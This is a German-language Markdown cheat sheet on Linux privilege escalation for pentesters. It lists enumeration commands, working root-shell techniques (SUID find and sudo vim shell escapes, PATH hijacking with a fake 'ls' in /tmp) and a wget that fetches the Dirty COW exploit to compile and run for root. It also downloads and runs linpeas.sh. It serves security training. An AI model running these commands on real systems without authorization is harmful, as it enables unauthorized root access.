# Linux Privilege Escalation


---

## Inhaltsverzeichnis
- [Einleitung](#einleitung)
- [1. System Checks & Enumeration](#1-system-checks--enumeration)
- [2. SUID-Binaries & Exploits](#2-suid-binaries--exploits)
- [3. Exploitable Binaries & Schwachstellen](#3-exploitable-binaries--schwachstellen)
- [4. Kernel Exploits (lokale Ausnutzung)](#4-kernel-exploits-lokale-ausnutzung)
- [Tools zur Privilege Escalation](#tools-zur-privilege-escalation)
- [Haftungsausschluss](#haftungsausschluss)

---

## Einleitung

Diese Datei dient als strukturiertes Cheat Sheet zur Privilege Escalation auf Linux-Systemen im Rahmen von Post-Exploitation. Sie hilft Pentestern und Sicherheitsanalysten, systematisch nach Wegen zu suchen, um aus eingeschränkten Benutzerrechten Root-Rechte zu erlangen. **Ausschließlich für legale Schulungszwecke gedacht.**

---

## 1. System Checks & Enumeration

### Grundlegende Informationen

```bash
uname -a              # Kernel- und Systeminformationen
cat /etc/os-release   # Distribution & Versionsinfo
id                    # Benutzer & Gruppen
whoami                # aktueller Nutzer
hostname              # Hostname anzeigen
```

### Berechtigungen

```bash
sudo -l               # Welche Befehle kann der Benutzer mit sudo ausführen?
groups                # Gruppenzugehörigkeit
```

### Filesystem nach Hinweisen durchsuchen

```bash
find / -perm -4000 2>/dev/null       # SUID-Binaries
find / -type f -perm -u=s 2>/dev/null
find / -writable -type d 2>/dev/null # beschreibbare Verzeichnisse
```

---

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## 2. SUID-Binaries & Exploits

SUID-Binaries werden mit den Rechten des Dateieigentümer (oft root) ausgeführt.

### Bekannte gefährliche SUIDs:

```bash
/usr/bin/vim
/usr/bin/find
/usr/bin/nmap
/usr/bin/perl
/usr/bin/python
```

### GTFOBins — SUID Missbrauch

GTFOBins ist eine Sammlung von Binaries, die sich zur Escalation nutzen lassen:
[https://gtfobins.github.io/](https://gtfobins.github.io/)

Beispiel (wenn `find` SUID ist):

```bash
find . -exec /bin/sh -p \; -quit
```

---

## 3. Exploitable Binaries & Schwachstellen

### PATH-Variable manipulieren

```bash
# Falls ein Skript ein nicht vollqualifiziertes Kommando wie 'ls' aufruft
# und root-Rechte hat:
export PATH=/tmp:$PATH
echo "/bin/sh" > /tmp/ls
chmod +x /tmp/ls
```

### Cronjobs & Writable Scripts

```bash
cat /etc/crontab
ls -la /etc/cron.*
# Suche nach Cronjobs, die als root laufen und beschreibbare Skripte ausführen
```

### Sudo ohne Passwort

```bash
# Wenn sudo -l sowas zeigt:
(root) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'
```

---

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## 4. Kernel Exploits (lokale Ausnutzung)

Falls keine "Low Hanging Fruits" über SUIDs/Sudo/etc., dann auf Kernel-Level prüfen:

### Kernel-Version ermitteln

```bash
uname -r
```

### Exploit-Sammlung

* [https://www.exploit-db.com/](https://www.exploit-db.com/)
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

> **Wichtig:** Nicht jeder Exploit funktioniert auf jeder Version. Führe sie in isolierter Umgebung aus (VM).

Beispiel: Dirty COW (CVE-2016-5195)

```bash
wget https://www.exploit-db.com/raw/40616
# Kompilieren und ausführen, um Root-Zugriff zu erlangen
```

---

## Tools zur Privilege Escalation

| Tool                                                                        | Zweck                                              |
| --------------------------------------------------------------------------- | -------------------------------------------------- |
| [linpeas.sh](https://github.com/carlospolop/PEASS-ng)                       | Automatisiertes Enumeration-Skript                 |
| [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) | Zeigt Kernel-Exploits für das Zielsystem an        |
| pspy                                                                        | Prozesse und Cronjobs ohne Root anzeigen           |
| LES (LinEnum)                                                               | Systematische Prüfung auf Escalation-Möglichkeiten |

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---